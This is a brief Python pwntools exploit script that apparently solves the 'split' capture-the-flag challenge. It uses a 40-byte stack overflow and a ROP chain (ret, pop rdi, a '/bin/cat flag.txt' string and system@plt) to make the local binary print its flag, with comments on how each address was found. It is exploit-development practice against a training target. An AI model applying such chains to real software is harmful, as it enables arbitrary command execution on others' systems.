from pwn import *

elf = ELF('./split')
rop = ROP(elf)

# addresses
pop_rdi  = 0x4007c3        # pop rdi; ret found from displaying gadgets with pwntools
system   = 0x400560        # system@plt found from disass
bincat   = 0x601060            # found with search-pattern in gdb

offset = 40 #found by sending a cyclic input and viewing the $rip value and calculating.
ret = 0x40053e

payload  = b'A' * offset
payload += p64(ret)
payload += p64(pop_rdi)    # pop rdi; ret — next value goes into rdi
payload += p64(bincat)     # rdi = address of "/bin/cat flag.txt"
payload += p64(system)     # call system(rdi)

p = process('./split')
p.recvuntil(b'> ')
p.sendline(payload)
print(p.recvall())
